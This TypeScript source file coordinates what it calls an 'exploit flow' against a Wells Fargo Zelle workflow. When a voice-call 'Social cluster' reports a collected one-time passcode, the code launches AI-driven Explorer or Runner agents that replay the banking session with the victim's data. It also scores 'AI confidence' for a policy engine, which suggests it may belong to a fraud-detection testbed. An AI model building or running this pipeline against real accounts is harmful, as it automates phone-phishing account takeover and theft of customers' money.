import { RedisClient } from './redis-client';
import { ExplorerAgent } from './agents/explorer-agent';
import { RunnerAgent } from './agents/runner-agent';
import { ScoringAgent } from './agents/scoring-agent';
import { OrchestratorConfig, SessionData } from './types';
import { logger } from './logging';
import * as fs from 'fs/promises';
import * as path from 'path';

/**
 * Zelle Orchestrator - Multi-Agent coordinator for Wells Fargo Zelle workflow
 * Coordinates Explorer, Runner, and Scoring agents in response to Social cluster triggers
 */
export class ZelleOrchestrator {
  private redis: RedisClient;
  private explorerAgent: ExplorerAgent;
  private runnerAgent: RunnerAgent;
  private scoringAgent: ScoringAgent;
  private config: OrchestratorConfig;
  private isRunning: boolean = false;

  constructor(config: OrchestratorConfig) {
    this.config = config;
    this.redis = new RedisClient(config.redisUrl);
    
    this.explorerAgent = new ExplorerAgent({
      workflowsDir: config.workflowsDir,
      screenshotsDir: config.screenshotsDir,
      anthropicApiKey: config.anthropicApiKey,
    });

    this.runnerAgent = new RunnerAgent({
      workflowsDir: config.workflowsDir,
      artifactsDir: config.artifactsDir,
      screenshotsDir: config.screenshotsDir,
    });

    this.scoringAgent = new ScoringAgent();
  }

  /**
   * Start listening for Social cluster events via Redis
   */
  async start(): Promise<void> {
    logger.info('[Orchestrator] Starting Zelle Multi-Agent System...');

    // Health check Redis
    const redisHealthy = await this.redis.ping();
    if (!redisHealthy) {
      throw new Error('Redis connection failed');
    }
    logger.info('[Orchestrator] Redis connection healthy');

    // Ensure directories exist
    await this.ensureDirectories();

    // Subscribe to social cluster events
    await this.redis.subscribeToSocialEvents(async (channel, message) => {
      await this.handleSocialEvent(channel, message);
    });

    this.isRunning = true;
    logger.info('[Orchestrator] Listening for VAPI triggers on Redis...');
    logger.info('[Orchestrator] Waiting for "social:otp_collected" events...');
  }

  /**
   * Handle events from Social cluster (VAPI)
   */
  private async handleSocialEvent(channel: string, message: any): Promise<void> {
    if (channel === 'social:otp_collected') {
      const { sessionId } = message;
      logger.info(`[Orchestrator] OTP collected for session ${sessionId}, triggering exploit flow`);
      
      // Execute exploit flow in background (non-blocking)
      this.executeExploitFlow(sessionId).catch((error) => {
        logger.error(`[Orchestrator] Exploit flow failed for ${sessionId}:`, error);
      });
    } else if (channel === 'social:call_ended') {
      logger.info(`[Orchestrator] Call ended for session ${message.sessionId}`);
    }
  }

  /**
   * Execute complete exploit flow: Explore/Run → Score → Report
   */
  private async executeExploitFlow(sessionId: string): Promise<void> {
    const startTime = Date.now();
    logger.info(`[Orchestrator] ===== Starting exploit flow for ${sessionId} =====`);

    try {
      // 1. Get session data from Redis
      const session = await this.redis.getSessionData(sessionId);
      if (!session) {
        throw new Error(`Session data not found for ${sessionId}`);
      }

      logger.info(`[Orchestrator] Session data retrieved: ${session.username}`);

      // 2. Check if DSL exists (Explorer vs Runner mode)
      const dslExists = await this.checkDSLExists('wells_fargo_zelle');
      
      let runResult;
      
      if (!dslExists && this.config.enableExplorer) {
        // First run: Use Explorer to capture workflow
        logger.info('[Orchestrator] No DSL found, running Explorer (capture mode)...');
        const explorerResult = await this.explorerAgent.capture(session);
        
        if (!explorerResult.success) {
          throw new Error(`Explorer failed: ${explorerResult.errors.map(e => e.message).join(', ')}`);
        }

        // Convert Explorer result to RunResult format
        runResult = {
          success: explorerResult.success,
          metrics: {
            duration: Date.now() - startTime,
            timings: {},
            actions: [],
            device: {},
            network: {},
          },
          screenshots: explorerResult.artifacts
            .filter(a => a.type === 'screenshot')
            .map(a => a.path),
        };

        logger.info('[Orchestrator] Explorer completed successfully, DSL generated');
      } else {
        // Subsequent runs: Use Runner for deterministic replay
        logger.info('[Orchestrator] DSL exists, running deterministic replay...');
        runResult = await this.runnerAgent.execute(session);
        logger.info(`[Orchestrator] Runner completed: ${runResult.success ? 'SUCCESS' : 'FAILED'}`);
      }

      // 3. Compute Agent Score (if enabled)
      let agentScore;
      if (this.config.enableScoring) {
        logger.info('[Orchestrator] Computing Agent Score...');
        agentScore = await this.scoringAgent.analyze(runResult);
        logger.info(`[Orchestrator] Agent Score: ${agentScore.value.toFixed(3)} (${agentScore.recommendation})`);

        // Generate webhook payload for Policy Engine
        if (this.scoringAgent.isCritical(agentScore)) {
          logger.warn('[Orchestrator] CRITICAL: High AI confidence detected!');
          const webhookPayload = this.scoringAgent.generateWebhookPayload(
            sessionId,
            agentScore,
            runResult
          );
          // TODO: Send to Policy Engine webhook
          logger.info('[Orchestrator] Webhook payload:', webhookPayload);
        }
      }

      // 4. Store results in Redis
      const duration = Date.now() - startTime;
      await this.redis.setExploitResult(sessionId, {
        success: runResult.success,
        duration,
        agentScore: agentScore?.value,
        bundleUrl: runResult.bundleUrl,
      });

      // 5. Publish completion event (for VAPI to close call)
      await this.redis.publishExploitCompleted(sessionId, {
        success: runResult.success,
        duration,
        agentScore: agentScore?.value,
      });

      logger.info(`[Orchestrator] ===== Exploit flow completed in ${duration}ms =====`);
      logger.info(`[Orchestrator] Success: ${runResult.success}, Score: ${agentScore?.value || 'N/A'}`);

    } catch (error: any) {
      const duration = Date.now() - startTime;
      logger.error(`[Orchestrator] Exploit flow failed after ${duration}ms:`, error);

      // Store error result
      await this.redis.setExploitResult(sessionId, {
        success: false,
        duration,
        error: error.message,
      });

      await this.redis.publishExploitCompleted(sessionId, {
        success: false,
        error: error.message,
      });
    }
  }

  /**
   * Check if workflow DSL exists
   */
  private async checkDSLExists(workflow: string): Promise<boolean> {
    try {
      const dslPath = path.join(this.config.workflowsDir, `${workflow}_v0.1.yaml`);
      await fs.access(dslPath);
      return true;
    } catch {
      return false;
    }
  }

  /**
   * Ensure required directories exist
   */
  private async ensureDirectories(): Promise<void> {
    await fs.mkdir(this.config.workflowsDir, { recursive: true });
    await fs.mkdir(this.config.artifactsDir, { recursive: true });
    await fs.mkdir(this.config.screenshotsDir, { recursive: true });
    logger.info('[Orchestrator] Directories initialized');
  }

  /**
   * Graceful shutdown
   */
  async stop(): Promise<void> {
    logger.info('[Orchestrator] Shutting down...');
    this.isRunning = false;
    await this.redis.disconnect();
    logger.info('[Orchestrator] Shutdown complete');
  }

  /**
   * Health check
   */
  async health(): Promise<{ redis: boolean; running: boolean }> {
    return {
      redis: await this.redis.ping(),
      running: this.isRunning,
    };
  }
}
